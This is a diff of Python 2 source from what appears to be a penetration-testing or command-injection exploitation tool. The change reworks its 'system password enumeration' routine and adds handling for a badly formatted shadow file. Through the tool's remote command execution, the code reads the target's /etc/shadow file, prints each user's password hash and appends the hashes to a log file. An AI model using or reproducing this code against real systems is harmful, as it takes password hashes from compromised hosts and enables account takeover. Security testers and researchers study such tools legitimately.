@@ -218,29 +218,30 @@ def enumeration(url, cve, check_header, filename):
         print "\n" + Back.RED + "(x) Error: Cannot open '" + settings.PASSWD_FILE + "'." + Style.RESET_ALL
     settings.ENUMERATION_DONE = True
 
-    #-------------------------------------
-    # System password enumeration
-    #-------------------------------------
-    if menu.options.passwords:
-      cmd = settings.SYS_PASSES            
-      sys_passes = cmd_exec(url, cmd, cve, check_header, filename)
-      if sys_passes :
-        sys_passes = "".join(str(p) for p in sys_passes)
-        sys_passes = sys_passes.replace(" ", "\n")
-        sys_passes = sys_passes.split( )
-        if len(sys_passes) != 0 :
-          sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
-          sys.stdout.flush()
-          sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
-          sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
-          sys.stdout.flush()
-          # Add infos to logs file.   
-          output_file = open(filename, "a")
-          output_file.write("    (!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" )
-          output_file.close()
-          count = 0
-          for line in sys_passes:
-            count = count + 1
+  #-------------------------------------
+  # System password enumeration
+  #-------------------------------------
+  if menu.options.passwords:
+    cmd = settings.SYS_PASSES            
+    sys_passes = cmd_exec(url, cmd, cve, check_header, filename)
+    if sys_passes :
+      sys_passes = "".join(str(p) for p in sys_passes)
+      sys_passes = sys_passes.replace(" ", "\n")
+      sys_passes = sys_passes.split( )
+      if len(sys_passes) != 0 :
+        sys.stdout.write("(*) Fetching '" + settings.SHADOW_FILE + "' to enumerate users password hashes... ")
+        sys.stdout.flush()
+        sys.stdout.write("[ " + Fore.GREEN + "SUCCEED" + Style.RESET_ALL + " ]")
+        sys.stdout.write(Style.BRIGHT + "\n(!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" + Style.RESET_ALL)
+        sys.stdout.flush()
+        # Add infos to logs file.   
+        output_file = open(filename, "a")
+        output_file.write("    (!) Identified " + str(len(sys_passes)) + " entries in '" + settings.SHADOW_FILE + "'.\n" )
+        output_file.close()
+        count = 0
+        for line in sys_passes:
+          count = count + 1
+          try:
             fields = line.split(":")
             if fields[1] != "*" and fields[1] != "!" and fields[1] != "":
               print "  ("+str(count)+") " + Style.BRIGHT + fields[0]+ Style.RESET_ALL + " : " + Style.BRIGHT + fields[1]+ Style.RESET_ALL
@@ -248,9 +249,17 @@ def enumeration(url, cve, check_header, filename):
               output_file = open(filename, "a")
               output_file.write("      ("+str(count)+") " + fields[0] + " : " + fields[1])
               output_file.close()
-        else:
-          print Fore.YELLOW + "(^) Warning: Cannot open '" + settings.SHADOW_FILE + "'." + Style.RESET_ALL
-      settings.ENUMERATION_DONE = True  
+          # Check for appropriate (/etc/shadow) format
+          except IndexError:
+            if count == 1 :
+              sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that '" + settings.SHADOW_FILE + "' file is not in the appropriate format. Thus, it is expoted as a text file." + Style.RESET_ALL + "\n")
+            print fields[0]
+            output_file = open(filename, "a")
+            output_file.write("      " + fields[0])
+            output_file.close()
+      else:
+        print Fore.YELLOW + "(^) Warning: Cannot open '" + settings.SHADOW_FILE + "'." + Style.RESET_ALL
+    settings.ENUMERATION_DONE = True  
 
   if settings.ENUMERATION_DONE == True:
     print ""
